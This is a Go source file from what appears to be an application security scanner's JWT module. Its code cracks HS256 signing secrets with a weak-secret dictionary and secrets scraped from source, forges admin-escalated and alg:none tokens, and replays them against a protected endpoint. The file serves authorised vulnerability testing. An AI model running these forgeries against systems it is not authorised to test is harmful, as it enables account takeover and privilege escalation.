package gored

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"
)

// JWTToken is a parsed JSON Web Token: its three base64url segments plus the decoded
// header and claims. It is UNTRUSTED input — a token the app issued that GORED inspects
// and tries to forge, never a verdict.
type JWTToken struct {
	Raw          string
	SigningInput string // header.payload — the bytes an HS256 signature covers
	SigB64       string // the token's signature segment (base64url, no padding)
	Header       map[string]any
	Claims       map[string]any
	Alg          string
}

// ParseJWT splits and decodes a compact JWT. It does not verify the signature — that is
// the point: GORED parses the claims to see what the app trusts, then tries to forge them.
func ParseJWT(raw string) (*JWTToken, error) {
	raw = strings.TrimSpace(strings.TrimPrefix(raw, "Bearer "))
	parts := strings.Split(raw, ".")
	if len(parts) != 3 {
		return nil, fmt.Errorf("not a compact JWT (want 3 dot-separated segments, got %d)", len(parts))
	}
	hdr, err := b64Decode(parts[0])
	if err != nil {
		return nil, fmt.Errorf("bad header segment: %w", err)
	}
	pay, err := b64Decode(parts[1])
	if err != nil {
		return nil, fmt.Errorf("bad payload segment: %w", err)
	}
	t := &JWTToken{Raw: raw, SigningInput: parts[0] + "." + parts[1], SigB64: parts[2]}
	t.Header = map[string]any{}
	t.Claims = map[string]any{}
	if err := json.Unmarshal(hdr, &t.Header); err != nil {
		return nil, fmt.Errorf("header is not JSON: %w", err)
	}
	_ = json.Unmarshal(pay, &t.Claims) // a non-object payload is unusual but not fatal
	if a, ok := t.Header["alg"].(string); ok {
		t.Alg = a
	}
	return t, nil
}

// DefaultJWTSecrets is the built-in weak-secret dictionary the cracker always tries: the
// defaults and examples that ship in tutorials and get left in production. App-specific
// secrets are added by harvesting the source (HarvestSecrets) or the probe's Secrets.
var DefaultJWTSecrets = []string{
	"secret", "secretkey", "secret_key", "mysecret", "supersecret", "password", "passw0rd",
	"changeme", "change-me", "admin", "test", "jwt", "jwtsecret", "jwt_secret", "token",
	"key", "private", "signingkey", "signing_key", "your-256-bit-secret", "your_secret_key",
	"s3cr3t", "secret123", "qwerty", "123456", "hmac", "default",
}

// CrackHS256 returns the first candidate secret whose HMAC-SHA256 over the token's signing
// input reproduces its signature — proving the token was signed with that secret, so it
// can be forged. It returns "" if none match. This is offline: no request to the app.
func CrackHS256(t *JWTToken, candidates []string) string {
	if !strings.EqualFold(t.Alg, "HS256") {
		return ""
	}
	want := t.SigB64
	for _, s := range candidates {
		if hs256(t.SigningInput, s) == want {
			return s
		}
	}
	return ""
}

// ForgeHS256 builds a token with the given claims, validly signed HS256 with secret.
func ForgeHS256(claims map[string]any, secret string) string {
	h := b64Encode([]byte(`{"alg":"HS256","typ":"JWT"}`))
	p := b64Encode(mustJSON(claims))
	si := h + "." + p
	return si + "." + hs256(si, secret)
}

// ForgeNone builds an alg:none token (empty signature) with the given claims — the
// attack on verifiers that trust the header's alg and skip the signature.
func ForgeNone(claims map[string]any) string {
	h := b64Encode([]byte(`{"alg":"none","typ":"JWT"}`))
	p := b64Encode(mustJSON(claims))
	return h + "." + p + "."
}

var reSecretAssign = regexp.MustCompile(`(?i)(secret|signing[_-]?key|jwt|hmac|token[_-]?key|private[_-]?key|passw)\w*\s*[:=]+\s*["'` + "`" + `]([^"'` + "`" + `\s]{4,80})["'` + "`" + `]`)

// HarvestSecrets scans a source tree for string literals assigned to secret-ish
// identifiers (jwtSecret, signingKey, JWT_SECRET, ...), the secret-in-source case the
// forge turns into a certain finding. It is opt-in (it needs a directory) and reads text
// files only, so it does not depend on any language — it matches the literal, not the
// grammar.
func HarvestSecrets(dir string) []string {
	seen := map[string]bool{}
	var out []string
	_ = filepath.WalkDir(dir, func(path string, d os.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			if d != nil && d.IsDir() && skipDir(d.Name()) {
				return filepath.SkipDir
			}
			return nil
		}
		info, e := d.Info()
		if e != nil || info.Size() > 2<<20 { // skip blobs
			return nil
		}
		b, e := os.ReadFile(path)
		if e != nil {
			return nil
		}
		for _, m := range reSecretAssign.FindAllStringSubmatch(string(b), -1) {
			if v := m[2]; !seen[v] {
				seen[v] = true
				out = append(out, v)
			}
		}
		return nil
	})
	return out
}

func skipDir(name string) bool {
	switch name {
	case ".git", "node_modules", "vendor", "dist", "build", ".idea", "testdata":
		return true
	}
	return false
}

// JWTFinding is one token's analysis: whether, and how, a low-privilege caller could
// forge a token the app accepts.
type JWTFinding struct {
	IsJWT        bool
	Alg          string
	Vector       string         // "secret-in-source" | "weak-secret" | "alg-none" | "no-signature-check" | ""
	Secret       string         // the cracked secret, for the repro (empty for alg-none)
	Forged       string         // the forged token that was accepted
	Confidence   Confidence     // certain (forged token accepted on replay) | high (forgeable, replay not confirmed)
	CWE          string         // CWE-347 (improper verification of a cryptographic signature)
	Evidence     string         //
	ReplayStatus int            // the status the forged token got on the protected path
	Request      map[string]any // the capturing replay, for a repro
}

// Flagged reports whether a forgery vector was found.
func (f JWTFinding) Flagged() bool { return f.Vector != "" }

// JWTProbe inspects a token the app issued to the low-privilege identity and tries to
// forge one the app will accept — the token attacks scanners cannot run because they need
// a live token and a live verifier. It cracks the HS256 secret against a weak-secret
// dictionary and any secrets harvested from the source, forges an escalated token with
// the cracked secret, and (when given a protected path) replays it: acceptance is the
// executed proof, a certain finding. It also tries alg:none and an unknown-secret token
// to catch verifiers that trust the header or skip verification. A properly verified
// token signed with a strong, non-source secret yields nothing — no false positive.
type JWTProbe struct {
	Base          string
	Egress        *Egress
	Sessions      *Sessions
	Low           Identity
	Secrets       []string // extra candidates (e.g. HarvestSecrets output); tried before the defaults
	EscalateClaim string   // the claim to flip when forging (default "role")
	EscalateValue any      // the value to set it to (default "admin")
	Timeout       time.Duration
}

// Analyze parses token, attempts the forgery vectors, and (if verifyPath is set) replays
// the forged token there as the low-priv identity to confirm acceptance.
func (p *JWTProbe) Analyze(ctx context.Context, token, verifyPath string) (JWTFinding, error) {
	t, err := ParseJWT(token)
	if err != nil {
		return JWTFinding{IsJWT: false, Evidence: err.Error()}, nil
	}
	f := JWTFinding{IsJWT: true, Alg: t.Alg, CWE: "CWE-347"}
	claim, val := p.EscalateClaim, p.EscalateValue
	if claim == "" {
		claim = "role"
	}
	if val == nil {
		val = "admin"
	}
	escalated := cloneClaims(t.Claims)
	escalated[claim] = val

	// Vector 1: the signing secret is weak or sits in the source. Cracking it offline
	// already proves forgeability; a replay of an escalated token proves exploitability.
	if secret := CrackHS256(t, p.Secrets); secret != "" {
		return p.confirm(ctx, f, "secret-in-source", secret, ForgeHS256(escalated, secret), verifyPath,
			fmt.Sprintf("HS256 secret %q was found in the source; forged a token with %s=%v", secret, claim, val)), nil
	}
	if secret := CrackHS256(t, DefaultJWTSecrets); secret != "" {
		return p.confirm(ctx, f, "weak-secret", secret, ForgeHS256(escalated, secret), verifyPath,
			fmt.Sprintf("HS256 secret %q is a known weak default; forged a token with %s=%v", secret, claim, val)), nil
	}

	// Vectors that need the live verifier to confirm (they are only bugs if accepted).
	if verifyPath != "" {
		// Vector 2: the verifier trusts the header's alg and accepts an unsigned token.
		none := ForgeNone(escalated)
		if st, _ := p.replay(ctx, verifyPath, none); ok2xx(st) {
			f.Vector, f.Forged, f.Confidence, f.ReplayStatus = "alg-none", none, ConfCertain, st
			f.Evidence = fmt.Sprintf("an alg:none token with %s=%v was accepted (HTTP %d) — the verifier trusts the header alg", claim, val, st)
			f.Request = map[string]any{"method": "GET", "path": verifyPath, "authorization": "Bearer " + none}
			return f, nil
		}
		// Vector 3: the verifier does not check the signature at all — a token signed
		// with a secret the app cannot know is still accepted.
		bogus := ForgeHS256(escalated, "gored-unknown-secret-"+newCanaryMarker())
		if st, _ := p.replay(ctx, verifyPath, bogus); ok2xx(st) {
			f.Vector, f.Forged, f.Confidence, f.ReplayStatus = "no-signature-check", bogus, ConfCertain, st
			f.Evidence = fmt.Sprintf("a token signed with an unknown secret was accepted (HTTP %d) — the signature is not verified", st)
			f.Request = map[string]any{"method": "GET", "path": verifyPath, "authorization": "Bearer " + bogus}
			return f, nil
		}
	}
	return f, nil // not flagged: strong secret, alg checked, signature verified
}

// confirm forges a finding and, when a verify path is given, replays the forged token to
// raise it from high (forgeable) to certain (accepted).
func (p *JWTProbe) confirm(ctx context.Context, f JWTFinding, vector, secret, forged, verifyPath, evidence string) JWTFinding {
	f.Vector, f.Secret, f.Forged, f.Evidence = vector, secret, forged, evidence
	f.Confidence = ConfHigh
	if verifyPath != "" {
		st, _ := p.replay(ctx, verifyPath, forged)
		f.ReplayStatus = st
		f.Request = map[string]any{"method": "GET", "path": verifyPath, "authorization": "Bearer " + forged}
		if ok2xx(st) {
			f.Confidence = ConfCertain
			f.Evidence += fmt.Sprintf("; replayed on %s and accepted (HTTP %d)", verifyPath, st)
		} else {
			f.Evidence += fmt.Sprintf("; replay on %s returned HTTP %d (forgeable, acceptance unconfirmed)", verifyPath, st)
		}
	}
	return f
}

// replay sends the forged token as a Bearer credential to a protected path, through the
// egress gate, as the low-priv identity (its other headers ride along).
func (p *JWTProbe) replay(ctx context.Context, path, token string) (int, string) {
	if !strings.HasPrefix(path, "/") {
		path = "/" + path
	}
	raw := p.Base + path
	if !p.Egress.Allowed(raw) {
		return 0, ""
	}
	to := p.Timeout
	if to == 0 {
		to = 8 * time.Second
	}
	client := &http.Client{Timeout: to, Jar: p.Sessions.Client(p.Low.Session).Jar,
		CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, raw, nil)
	if err != nil {
		return 0, ""
	}
	for k, v := range p.Low.Headers {
		req.Header.Set(k, v)
	}
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := client.Do(req)
	if err != nil {
		return 0, ""
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 64<<10))
	return resp.StatusCode, string(b)
}

func hs256(signingInput, secret string) string {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(signingInput))
	return b64Encode(mac.Sum(nil))
}

func b64Encode(b []byte) string { return base64.RawURLEncoding.EncodeToString(b) }
func b64Decode(s string) ([]byte, error) {
	return base64.RawURLEncoding.DecodeString(strings.TrimRight(s, "="))
}

func mustJSON(v any) []byte { b, _ := json.Marshal(v); return b }

func cloneClaims(m map[string]any) map[string]any {
	out := make(map[string]any, len(m)+1)
	for k, v := range m {
		out[k] = v
	}
	return out
}
